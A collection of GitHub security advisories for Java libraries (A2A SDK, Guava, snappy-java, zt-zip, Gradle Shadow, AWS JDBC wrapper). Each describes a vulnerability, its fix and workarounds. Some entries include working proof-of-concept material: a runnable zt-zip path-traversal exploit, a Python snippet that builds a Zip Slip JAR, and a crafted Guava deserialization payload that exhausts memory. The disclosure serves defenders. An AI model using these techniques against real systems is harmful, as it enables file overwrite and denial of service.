### GHSA-qw47-mcm5-934w — A2A Java SDK has a fail-open default task authorization
- Aliases: CVE-2026-111764 | Published: 2026-10-20 | Modified: 2026-10-20 | Severity: HIGH
- CWE: CWE-1188, CWE-862
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
- Affected Maven/org.a2aproject.sdk:a2a-java-sdk-server-common: introduced:0 fixed:1.3.0.Final

Draft text for GHSA-qw47-mcm5-934w. The body below drops into the GitHub advisory description
field; the metadata block maps to the form fields. Set the patched version at release; publish
when the fix ships._

---

- **Ecosystem:** Maven
- **Affected package:** `org.a2aproject.sdk:a2a-java-sdk-server-common` (task store / authorization)
- **Affected versions:** `<= 1.2.0.Final` (and `1.2.1.Final-SNAPSHOT` on `main` prior to the fix)
- **Patched version:** _(the release that carries the fix, e.g. 1.2.1.Final)_
- **CWE:** CWE-1188 (Insecure Default Initialization), CWE-862 (Missing Authorization)
- **Severity:** High
- **CVSS v3.1:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (7.5, High)

---

## Details

The default task store performs no authorization on task reads. `InMemoryTaskStore`'s no-arg
constructor sets `authorizationProvider = null`, and `InMemoryTaskStore.get(String taskId)` is a
bare map lookup with no authorization check regardless of provider:

```java
public InMemoryTaskStore() {
    this.authorizationProvider = null;   // default wiring
}

@Override
public @Nullable Task get(String taskId) {
    return tasks.get(taskId);            // no owner / caller check
}
```

Authorization is enforced only when the application both supplies a `TaskAuthorizationProvider`
*and* routes requests through `AuthorizationRequestHandlerDecorator` (via CDI), which checks
ownership before delegating. A server that uses the default store, or wires
`DefaultRequestHandler.builder().build()` manually, or integrates through a non-CDI stack (e.g.
Spring), never reaches that check. The safe posture is therefore opt-in and the shipped default is
the unsafe one. A caller can read a task created by another caller simply by knowing or guessing
its id.

## Summary

With the SDK's default configuration, task reads are not authorized: any caller can retrieve a
task (including its status, context, message history, and artifacts) created by another caller,
by supplying the task id.

## PoC

Using only the real production classes wired the default way (no mocks):

1. Construct the default store: `InMemoryTaskStore store = new InMemoryTaskStore();` (no-arg
   constructor, so no authorization provider).
2. As one caller, save a task: `store.save(victimTask, false);` with id `victim-task-42`.
3. As a second, unrelated caller with no auth context, read it back: `store.get("victim-task-42")`.

The second caller receives the first caller's task in full, with no authorization check:

```
unauthenticated get(victim-task-42) returned task owned by nobody-checked: victim-task-42 / ctx=victim-ctx
```

Verified on `main` (commit `72d220c`, JDK 21) and reproduces unchanged on `1.2.0.Final`.

## Impact

Task data crosses caller boundaries with no authorization. In any multi-caller deployment built on
the default wiring, one caller can enumerate and read another caller's tasks, including task status,
context id, the message history, and any artifacts the task carries, which for agent workloads is
frequently sensitive input and generated content. Because the insecure behaviour is the default
rather than a misconfiguration, it is easy to ship unintentionally, and in the default/reference
deployment the transport endpoints are served without authentication enforced, so the read is
reachable by an unauthenticated caller (`PR:N`). CVSS is scored against the default configuration
as shipped.

## Remediation

Fail closed by default: deny task reads when no authorization provider is configured, rather than
treating a missing provider as allow-all, and apply the authorization check in the store's `get`
path (not only in `list` and the CDI decorator) so it holds regardless of how the handler is
wired. If the current permissive default is retained for single-user/testing scenarios, emit a
prominent startup warning when the server comes up with no authorization provider so it cannot be
shipped by accident.

## Workarounds

Until a fixed release, configure a `TaskAuthorizationProvider` and ensure requests are routed
through the authorization decorator (CDI wiring), rather than relying on the default no-arg store
or a manually built handler.

## References

- CWE-1188: Insecure Default Initialization of Resource: https://cwe.mitre.org/data/definitions/1188.html
- CWE-862: Missing Authorization: https://cwe.mitre.org/data/definitions/862.html

References:
- https://github.com/a2aproject/a2a-java/security/advisories/GHSA-qw47-mcm5-934w [WEB]
- https://nvd.nist.gov/vuln/detail/CVE-2026-111764 [ADVISORY]
- https://github.com/a2aproject/a2a-java/pull/1095 [WEB]
- https://github.com/a2aproject/a2a-java/commit/efb4e985e99390c4fc1f78c0a187a4254c0a2553 [WEB]
- https://github.com/a2aproject/a2a-java [PACKAGE]
- https://github.com/a2aproject/a2a-java/releases/tag/v1.3.0.Final [WEB]

### GHSA-4fpj-g9jf-9rgg — A2A Java SDK: Android synchronous POST forwards credentials across authorities after incomplete redirect fix
- Aliases: CVE-2026-111765 | Published: 2026-10-20 | Modified: 2026-10-20 | Severity: HIGH
- CWE: CWE-522
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
- Affected Maven/org.a2aproject.sdk:a2a-java-sdk-http-client-android: introduced:1.3.0.Final fixed:1.3.2.Final

The GHSA-9rhm fix added this safe setting in
AndroidA2AHttpClient.createConnection():

    connection.setInstanceFollowRedirects(false);

The synchronous POST builder later overwrites it:

    private boolean followRedirects = true;

    public A2AHttpResponse post() throws IOException {
        HttpURLConnection connection = createConnection("POST", false);
        connection.setInstanceFollowRedirects(followRedirects);
        // ...
    }

The second assignment wins. JSONRPCTransport and RestTransport both
add interceptor-produced headers and call synchronous post() without
setting followRedirects(false).

On Android's repackaged OkHttp implementation, a cross-authority
redirect strips Authorization but retains nonstandard request headers.
AuthInterceptor permits four nonstandard authentication header names:

    X-API-Key
    API-Key
    X-Auth-Token
    X-Authentication

I confirmed that the exact v1.3.1.Final Maven artifact forwards
complete synthetic values under all four names to a second loopback
authority. I also reproduced the supported AuthInterceptor to Android
POST path. Explicitly calling followRedirects(false) returns the
original 302 and produces no request to the collector.

All test traffic stayed on two ephemeral 127.0.0.1 listeners. All
credentials were synthetic FULCRUM-SYNTHETIC-* values.

Reproduction

I have attached AndroidA2AHttpClientRedirectTest.java. Copy it to:

    extras/http-client-android/src/test/java/org/a2aproject/sdk/client/http/android/

Run:

    mvn -pl extras/http-client-android -am \
      -Dtest=AndroidA2AHttpClientRedirectTest \
      -Dsurefire.failIfNoSpecifiedTests=false test

On unpatched current main, the default test fails with:

    Android synchronous POST must retain the documented no-redirect default
    expected: <302> but was: <200>

The explicit followRedirects(true) control still passes.

The separate exact-artifact fixture passed three consecutive runs. Its
relevant output was:

    default status=200 x-api-key=FULCRUM-SYNTHETIC-DIRECT
authorization=null method=GET
    control-followRedirects-false status=302 collectorHits=0
    interceptor-chain status=200
x-api-key=FULCRUM-SYNTHETIC-INTERCEPTOR collectorHits=1
    header-matrix name=X-API-Key forwarded=FULCRUM-SYNTHETIC-X-API-Key
    header-matrix name=API-Key forwarded=FULCRUM-SYNTHETIC-API-Key
    header-matrix name=X-Auth-Token forwarded=FULCRUM-SYNTHETIC-X-Auth-Token
    header-matrix name=X-Authentication
forwarded=FULCRUM-SYNTHETIC-X-Authentication

Impact and limitations

The demonstrated impact is disclosure of a complete API key or
authentication token to a different authority. I am not claiming
subsequent use of the credential, integrity impact, availability
impact, code execution, or host compromise.

A fully malicious origin already receives the credential on the first
request. The additional boundary matters most when redirect or
front-door behavior is compromised separately from the component that
handles request credentials, or when different parts of the origin
operate in different trust domains.

The 7.5 score applies to an autonomous client where no human action is
needed after the remote endpoint returns the redirect. If the Android
workflow requires a person to select or invoke the remote agent, UI:R
gives a 6.5 score. I have kept both vectors because that deployment
detail affects severity but not the underlying behavior. These are
suggested scores, consistent with the policy's statement that actual
CVSS depends on the specific deployment context. The same policy
labels the parent credential-redirect property as moderate.

Scope and prior art

This path appears to fall directly under the project's current security model:

1. extras/http-client-android and the client transports are listed as in scope.
2. Remote AgentCard and response data are treated as attacker-relevant inputs.
3. A malicious or compromised remote agent is part of the client-side
adversary model.
4. Section 8 says automatic redirects are disabled in all JDK, Vert.x,
and Android implementations to prevent credential leakage.
5. Section 13 defines a violation of a Section 8 property through the
covered input and adversary as VALID.
6. Section 13a lists missed call sites and under-strength mitigations
as new findings after an incomplete fix.
7. Section 14 records the original issue as fixed by disabling
redirects across all HTTP client implementations. The Android
synchronous path directly contradicts that recorded repair state.

This report does not claim that an AgentCard SecurityScheme
declaration enforces authentication. The application has already
configured the credential, and the shipped AuthInterceptor places it
in an allowed header. The failure is the Android client's default
redirect behavior after that point. It does not depend on a custom
SPI, an insecure configuration flag, a test-only component,
server-side authentication, or any of the recurring non-findings
listed in Section 11a.

GHSA-9rhm is the direct parent finding. Its fix commit says redirects
were disabled across all clients, but the Android POST-level override
remains in 1.3.0.Final, 1.3.1.Final, and current main. I searched the
public issues and pull requests on September 5 and found PR #1097, but
no report covering this surviving synchronous Android path. The other
three published advisories address server authorization defaults,
push-notification SSRF, and credential logging. They do not cover this
Android client path.

Suggested fix

The smallest compatible change is:

    - private boolean followRedirects = true;
    + private boolean followRedirects = false;

This keeps followRedirects(true) available as an explicit opt-in. The
attached regression passes three out of three times after the change.
The Android module and its reactor dependencies pass 455 tests with no
failures. The full repository test run passes 2,914 tests with no
failures or errors. It reports 127 skips when using the project's
documented -DskipDockerTests=true option inside the isolated build
container.

### GHSA-xxph-c9ww-hj94 — Google Guava: CompactHashMap/CompactHashSet/MapMakerInternalMap deserialization triggers uncontrolled memory allocation
- Aliases: CVE-2026-102554 | Published: 2026-10-27 | Modified: 2026-10-27 | Severity: HIGH
- CWE: CWE-400, CWE-502, CWE-770
- CVSS_V3: `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H`
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N`
- Affected Maven/com.google.guava:guava: introduced:4.0 fixed:33.7.2

# CompactHashMap/CompactHashSet/MapMakerInternalMap native deserialization triggers uncontrolled memory allocation

## Summary

`CompactHashMap`, `CompactHashSet`, and `MapMakerInternalMap` implement `readObject(ObjectInputStream)` by reading an attacker-controlled `elementCount` or `initialCapacity` from the stream. On the very first insertion during or after deserialization (for the `CompactHash*` collections, inside `allocArrays()`) or immediately during deserialization (for `MapMakerInternalMap`), the implementation eagerly allocates arrays sized to that full, unvalidated value (up to `CompactHashing.MAX_SIZE` = 2^30-1, ~1.07 billion, for example) before the rest of the stream's actual content has been consumed. A 72-byte malicious serialized stream containing a single tiny element can force a multi-gigabyte allocation and crash a JVM with `OutOfMemoryError`, dynamically confirmed against the current release.

## Details

`CompactHashMap.readObject()` (`guava/src/com/google/common/collect/CompactHashMap.java`):

```java
private void readObject(ObjectInputStream stream) throws IOException, ClassNotFoundException {
  stream.defaultReadObject();
  int elementCount = stream.readInt();
  if (elementCount < 0) {
    throw new InvalidObjectException("Invalid size: " + elementCount);
  }
  init(elementCount);
  for (int i = 0; i < elementCount; i++) {
    K key = (K) stream.readObject();
    V value = (V) stream.readObject();
    put(key, value);
  }
}
```

`elementCount` is only checked for being non-negative; there is no upper bound and no relationship enforced between the declared count and how much data actually follows in the stream. `init(elementCount)` (line 251) just stores the value (clamped to `[1, CompactHashing.MAX_SIZE]`, i.e. up to 2^30-1):

```java
void init(int expectedSize) {
  Preconditions.checkArgument(expectedSize >= 0, "Expected size must be >= 0");
  this.metadata = Ints.constrainToRange(expectedSize, 1, CompactHashing.MAX_SIZE);
}
```

The real allocation is deferred to `allocArrays()`, which fires lazily on the *first* `put()` call — i.e. after only one key/value pair has actually been read off the wire:

```java
int allocArrays() {
  ...
  int expectedSize = metadata;
  int buckets = CompactHashing.tableSize(expectedSize);
  this.table = CompactHashing.createTable(buckets);
  setHashTableMask(buckets - 1);
  this.entries = new int[expectedSize];
  this.keys = new Object[expectedSize];
  this.values = new Object[expectedSize];
  return expectedSize;
}
```

With `expectedSize` near `CompactHashing.MAX_SIZE` (2^30-1), this single call allocates a hash `table` plus three `expectedSize`-length arrays — multiple gigabytes — triggered by a stream that has, at that point, only supplied one small real element. `CompactHashSet.readObject()`/`allocArrays()` have the identical shape. `CompactLinkedHashMap`/`CompactLinkedHashSet` extend these classes and inherit the same unguarded path.

The problem with `MapMakerInternalMap` is similar, with [a size read from the serialized data and stored in a `MapMaker` instance](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L2848-L2851) for [later user during deserialization](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L2897), when [the `MapMaker` is passed back to `MapMakerInternalMap`](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMaker.java#L287) and [segments are allocated](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L173-L200) by [calling `newSegment`](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L1143), whose implementations ([example](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L443)) create `Segment` instances ([example](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L2019)) that [allocate arrays of the requested capacity](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L1234) through [the `newTable`](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L1262) helper.

This is the same amplification shape as the already-fixed **CVE-2018-10237** (`AtomicDoubleArray`/`CompoundOrdering`: attacker declares a large size, library eagerly allocates before validating against actual stream content). That fix rewrote `AtomicDoubleArray.readObject()` to grow an `ImmutableLongArray.Builder` incrementally per element actually read, rather than pre-allocating from the declared size — Guava's own `HashBiMap.readObject()` documents the same defensive principle explicitly in a comment: `init(16); // resist hostile attempts to allocate gratuitous heap`. `CompactHashMap`/`CompactHashSet` do not follow either of these two patterns already present elsewhere in the same codebase.

**Reachability**: All classes are top-level, `implements ... Serializable`, and require no special classpath setup beyond Guava being present (near-ubiquitous on JVM backends). A native Java deserialization attacker names the class directly in a hand-crafted stream — no particular Guava factory method needs to have been used by the victim application, exactly as with the precedent CVE.

## PoC

Full source and run instructions in the attached `poc-guava-compacthash-dos.zip` (Maven project, `guava:33.7.1-jre` — the current latest release — as the only dependency). The PoC:

1. Uses reflection only to legitimately obtain a `CompactHashSet` instance (it is package-private; a real attacker does not need this step, since they craft the serialized bytes directly rather than calling Guava's own serialization code).
2. Serializes one set with 1 element and one with 2 elements, diffs the two byte streams to locate the exact offset of the `elementCount` field (byte-precise, not guessed).
3. Patches that one 4-byte field in the 1-element stream from `1` to `0x3FFFFFFF` (`CompactHashing.MAX_SIZE`), leaving the rest of the 72-byte stream (one real `"A"` element) untouched.
4. Feeds the resulting 72-byte malicious stream into a plain `new ObjectInputStream(...).readObject()` call against the real, unmodified `guava-33.7.1-jre.jar`.

Actual run output:

```
### -Xmx8g (generous heap) ###
Located size field at offset 63, value=1 (expected 1)
Malicious stream size: 72 bytes
Declared elementCount: 1073741823 (~1.07 billion)
Real payload: 1 tiny string element ("A")
=== RESULT ===
Exception: java.lang.OutOfMemoryError: Java heap space
Time to allocate+fail: 4013 ms
Heap used before: 3 MB
Heap used after (at failure point): 4103 MB
JVM max heap (-Xmx): 8192 MB

### -Xmx128m (ordinary service-sized heap) ###
Located size field at offset 63, value=1 (expected 1)
Malicious stream size: 72 bytes
Declared elementCount: 1073741823 (~1.07 billion)
Real payload: 1 tiny string element ("A")
=== RESULT ===
Exception: java.lang.OutOfMemoryError: Java heap space
Time to allocate+fail: 24 ms
Heap used before: 4 MB
Heap used after (at failure point): 2 MB
JVM max heap (-Xmx): 128 MB
```

A 72-byte input forces ~4.1 GB of real allocation before failing on an 8 GB heap, and crashes a 128 MB heap in 24 ms — over 50,000x amplification between input size and forced allocation.

To reproduce: `mvn -q compile dependency:build-classpath -Dmdep.outputFile=cp.txt && java -Xmx128m -cp "target/classes:$(cat cp.txt)" poc.Poc`

## Impact

Uncontrolled resource consumption (CWE-770 / CWE-400) via native Java deserialization: any application that runs `ObjectInputStream.readObject()` on data reachable by an attacker, and has Guava on its classpath (true for a large fraction of the JVM ecosystem), can be crashed with a single ~72-byte payload, regardless of what type the application itself expected to deserialize.

## Severity

CVSS 3.1: `AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H` — identical vector to CVE-2018-10237, the precedent this is a sibling of. Recomputed with the full formula: exploitability = 8.22×0.85×0.44×0.85×0.85 = 2.221; ISS = 1-(1×1×0.44) = 0.56; impact = 6.42×0.56 = 3.595; base = roundup(5.816) = **5.9 (Medium)**.

## Affected

`com.google.guava:guava`, all editions (`-jre`/`-android`) — confirmed on the current latest release, 33.7.1-jre. `CompactHashMap`/`CompactHashSet`/`CompactLinkedHashMap`/`CompactLinkedHashSet` have had this same `readObject`/`allocArrays` shape for a long time (probably since they were added in Guava 23.6), and similarly for `MapMakerInternalMap` (which was introduced in Guava 4.0); not tested against older individual releases.

## Suggested fix

Apply the same defense already used elsewhere in this codebase: either clamp the initial `init()` capacity to a small constant regardless of the declared `elementCount` (as `HashBiMap.readObject()` already does — `init(16); // resist hostile attempts to allocate gratuitous heap`) and grow incrementally as elements are actually read, or grow the backing arrays incrementally per iteration of the deserialization loop (as the fixed `AtomicDoubleArray.readObject()` does via `ImmutableLongArray.Builder`) instead of eagerly sizing to the full attacker-declared count on first insert.

### GHSA-q233-g92q-qxp6 — snappy-java: Unbounded memory allocation from attacker-declared uncompressed lengtha
- Aliases: CVE-2026-108106 | Published: 2026-10-27 | Modified: 2026-10-27 | Severity: HIGH
- CWE: CWE-770, CWE-789
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- Affected Maven/org.xerial.snappy:snappy-java: introduced:0 fixed:1.1.10.9

### Impact
Several decompression paths in snappy-java allocate an output buffer sized by the uncompressed length declared in the first bytes of the compressed data, before decompressing or validating it. A few bytes of crafted input can therefore force an allocation of up to 2 GB, causing `OutOfMemoryError` (denial of service), or a `NegativeArraySizeException` for declared lengths of 2^31 or more.

Affected entry points include `Snappy.uncompress(byte[])`, `Snappy.uncompressString`, the `Snappy.uncompress*Array` methods, `SnappyInputStream`, and `SnappyFramedInputStream`. The `maxChunkSize` limit added for CVE-2023-43642 bounds only the compressed chunk length, so it does not prevent this.

### Patches
Fixed in 1.1.10.9 (#739). `Snappy.uncompressedLength()` now rejects negative declared lengths, and lengths larger than any valid Snappy stream of the given size can produce. The densest Snappy element expands 3 bytes to 64, so the limit is 64/3 of the compressed size. Allocations are therefore proportional to the input actually received.

### Workarounds
Before decompressing untrusted data, check that `Snappy.uncompressedLength(input)` is within an application-specific limit.

### GHSA-gwq9-9ffj-mvrv — snappy-java: Heap buffer overflow in Snappy.uncompress*Array typed-array methods
- Aliases: CVE-2026-93451 | Published: 2026-10-27 | Modified: 2026-10-27 | Severity: HIGH
- CWE: CWE-193, CWE-787
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- Affected Maven/org.xerial.snappy:snappy-java: introduced:0 fixed:1.1.10.9

### Impact
`Snappy.uncompressCharArray`, `uncompressShortArray`, `uncompressIntArray`, `uncompressLongArray`, `uncompressFloatArray` and `uncompressDoubleArray` sized the result array by dividing the declared uncompressed byte length by the element size, but native code wrote the full byte length. If the declared length is not a multiple of the element size, up to 7 bytes are written past the end of the Java array, corrupting the heap.

### Patches
Fixed in 1.1.10.9 ([#739](https://github.com/xerial/snappy-java/pull/739)). These methods now reject uncompressed lengths that are not a multiple of the element size with `SnappyIOException`.

### Workarounds
Check that `Snappy.uncompressedLength(input)` is a multiple of the element size before calling these methods.

### GHSA-52c6-99qm-3hqr — zt-zip: Path traversal in fluent API unpack
- Aliases: CVE-2026-63436 | Published: 2026-11-09 | Modified: 2026-11-09 | Severity: HIGH
- CWE: CWE-22
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L`
- Affected Maven/org.zeroturnaround:zt-zip: introduced:0 fixed:1.18.0

### Summary

`ZipUtil.unpack(...)` rejects ZIP entries that escape the target output directory, but the `Zips` fluent API appears to use a separate unpack implementation that does not apply the same destination-boundary check.

A ZIP entry such as:

```text
../escape/poc.txt
```

is written outside the configured destination directory when processed with:

```java
Zips.get(zip).unpack().destination(outputDir).process();
```

The transformer branch is affected as well.

### Tested Version

commit: 067935dca375500d3ff025aafcdf0e4283931b1a

### Root Cause

In `src/main/java/org/zeroturnaround/zip/Zips.java`, `Zips.UnpackingCallback.process(...)` builds the output file directly from the ZIP entry name:

```java
String entryName = zipEntry.getName();
File file = new File(destination, entryName);
```

The method then creates directories/files and copies content to that path:

```java
FileUtils.forceMkdir(file.getParentFile());
file.createNewFile();
FileUtils.copy(in, file);
```

When a transformer is configured, the same `file` is passed to `transformIntoFile(...)`.

There does not appear to be a canonical path check before these filesystem writes, so `../` entries can resolve outside `destination`.

### Minimal Reproduction

```java
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.zip.*;

import org.zeroturnaround.zip.ZipUtil;
import org.zeroturnaround.zip.Zips;
import org.zeroturnaround.zip.transform.ZipEntryTransformer;

public class ZipsTraversalPoc {
  public static void main(String[] args) throws Exception {
    Path work = Files.createTempDirectory("ztzip-zips-poc");
    Path zip = work.resolve("poc.zip");
    Path escaped = work.resolve("escape").resolve("poc.txt");
    String entryName = "../escape/poc.txt";

    Files.createDirectories(escaped.getParent());

    try (ZipOutputStream zos = new ZipOutputStream(Files.newOutputStream(zip))) {
      zos.putNextEntry(new ZipEntry(entryName));
      zos.write("plain branch\n".getBytes(StandardCharsets.UTF_8));
      zos.closeEntry();
    }

    Path zipUtilOut = work.resolve("ziputil-out");
    Files.createDirectories(zipUtilOut);
    try {
      ZipUtil.unpack(zip.toFile(), zipUtilOut.toFile());
      System.out.println("ZIPUTIL_REJECTED=false");
    }
    catch (Throwable t) {
      System.out.println("ZIPUTIL_REJECTED=" + t.getClass().getName());
    }
    System.out.println("ZIPUTIL_ESCAPED_EXISTS=" + Files.exists(escaped));

    Files.deleteIfExists(escaped);

    Path zipsOut = work.resolve("zips-out");
    Files.createDirectories(zipsOut);
    Zips.get(zip.toFile()).unpack().destination(zipsOut.toFile()).process();
    System.out.println("ZIPS_PLAIN_ESCAPED_EXISTS=" + Files.exists(escaped));
    System.out.println("ZIPS_PLAIN_ESCAPED_OUTSIDE_ROOT=" + !escaped.normalize().startsWith(zipsOut.normalize()));

    Files.deleteIfExists(escaped);

    Path zipsTransformOut = work.resolve("zips-transform-out");
    Files.createDirectories(zipsTransformOut);
    Zips.get(zip.toFile())
        .unpack()
        .destination(zipsTransformOut.toFile())
        .addTransformer(entryName, new ZipEntryTransformer() {
          public void transform(InputStream in, ZipEntry entry, ZipOutputStream out) throws IOException {
            out.putNextEntry(new ZipEntry(entry.getName()));
            out.write("transform branch\n".getBytes(StandardCharsets.UTF_8));
            out.closeEntry();
          }
        })
        .process();
    System.out.println("ZIPS_TRANSFORM_ESCAPED_EXISTS=" + Files.exists(escaped));
    System.out.println("ZIPS_TRANSFORM_ESCAPED_OUTSIDE_ROOT=" + !escaped.normalize().startsWith(zipsTransformOut.normalize()));
  }
}
```

Observed output:

```text
ZIPUTIL_REJECTED=org.zeroturnaround.zip.MaliciousZipException
ZIPUTIL_ESCAPED_EXISTS=false
ZIPS_PLAIN_ESCAPED_EXISTS=true
ZIPS_PLAIN_ESCAPED_OUTSIDE_ROOT=true
ZIPS_TRANSFORM_ESCAPED_EXISTS=true
ZIPS_TRANSFORM_ESCAPED_OUTSIDE_ROOT=true
```

### Expected Behavior

`Zips.get(zip).unpack().destination(outputDir).process()` should reject traversal entries or otherwise ensure that the resolved output path remains inside `outputDir`.

### Impact

Applications that unpack attacker-controlled ZIP files through the `Zips` fluent API may allow arbitrary file writes outside the intended extraction directory, depending on filesystem permissions and application layout.

### Suggested Fix

Apply the same destination-boundary validation used by `ZipUtil.unpack(...)` before any filesystem write in `Zips.UnpackingCallback.process(...)`.

For example, compare canonical `Path` values before creating directories or files:

```java
file.getCanonicalFile().toPath()
    .startsWith(destination.getCanonicalFile().toPath())
```

Regression tests should cover both:

```java
Zips.get(zip).unpack().destination(out).process();
Zips.get(zip).unpack().destination(out).addTransformer(...).process();

References:

- https://nvd.nist.gov/vuln/detail/CVE-2026-63436 [ADVISORY]
- https://github.com/zeroturnaround/zt-zip/pull/180 [WEB]
- https://github.com/zeroturnaround/zt-zip/commit/59a76ad576b0fcd50ea018e3608afb946c1492fd [WEB]

### GHSA-rr8v-fxxf-c986 — Gradle Shadow: Zip Slip path traversal in ShadowCopyAction — no independent entry-name sanitization
- Aliases: CVE-2026-75598 | Published: 2026-11-09 | Modified: 2026-11-09 | Severity: HIGH
- CWE: CWE-22
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H`
- Affected Maven/com.gradleup.shadow:com.gradleup.shadow.gradle.plugin: introduced:0 fixed:9.6.0

### Summary
ShadowCopyAction in the Shadow plugin does not validate or sanitize ZIP entry names before writing them to the output fat JAR. A malicious upstream dependency containing path traversal sequences (e.g. `../../../../tmp/pwned.txt`) in entry names will have those entries reproduced verbatim in the output shadow JAR.

### Details
The vulnerability exists because Shadow relies entirely on Gradle's ZipFileTree for entry sanitization rather than implementing its own path validation. This means:

1. Users on Gradle < 7.6.2 / 8.x < 8.2.0 are directly exploitable
2. The produced shadow JAR becomes a Zip Slip weapon against any 
downstream consumer using unprotected extraction (raw ZipInputStream, 
older CI tooling, custom Java unpackers)
3. If Shadow ever uses a non-ZipFileTree code path, protection 
disappears silently

Affected file: `src/main/kotlin/com/github/jengelman/gradle/plugins/shadow/internal/ShadowCopyAction.kt`

### PoC
1. Create a malicious JAR with path traversal entry:
```python
import zipfile
with zipfile.ZipFile('evil.jar', 'w') as zf:
    zf.writestr('../../../../tmp/zipslip_proof.txt', 'pwned')
```
2. Add as dependency in a shadow project
3. Run `gradle shadowJar`
4. Run `unzip -l build/libs/*.jar | grep "\.\."`
5. Traversal entry survives in output JAR

### Impact
Any tool extracting the shadow JAR with unprotected extraction is subject to arbitrary file overwrite. Users on older Gradle versions  are directly vulnerable at build time.

### GHSA-c5q4-97jw-jggh — AWS-advanced-jdbc-wrapper: Java Deserialization RCE via Cache Poisoning
- Aliases: CVE-2026-14265 | Published: 2026-11-17 | Modified: 2026-11-17 | Severity: HIGH
- CWE: CWE-502
- CVSS_V3: `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H`
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X`
- Affected Maven/software.amazon.jdbc:aws-advanced-jdbc-wrapper: introduced:3.3.0 fixed:4.0.1

### Impact
The AWS Advanced JDBC Wrapper is an open-source JDBC driver wrapper that extends a JDBC driver to enable Amazon Aurora and AWS Cloud features such as failover handling and caching. We identified CVE-2026-14265, an issue in the RemoteQueryCachePlugin of the AWS Advanced JDBC Wrapper. When this plugin is enabled, query results read from the shared Redis/Valkey cache are deserialized without class filtering. An actor with write access to the shared cache infrastructure could insert a crafted serialized Java object that, when read by an application, results in execution of arbitrary code on the application server.

### Workarounds
The RemoteQueryCachePlugin is not enabled by default. Customers who cannot immediately upgrade can mitigate this issue by disabling the RemoteQueryCachePlugin, and by restricting write access to the Redis/Valkey cache infrastructure to trusted principals.

- https://nvd.nist.gov/vuln/detail/CVE-2026-14265 [ADVISORY]
- https://aws.amazon.com/security/security-bulletins/2026-051-aws [WEB]
- https://github.com/aws/aws-advanced-jdbc-wrapper [PACKAGE]
- https://github.com/aws/aws-advanced-jdbc-wrapper/releases/tag/4.0.1 [WEB]
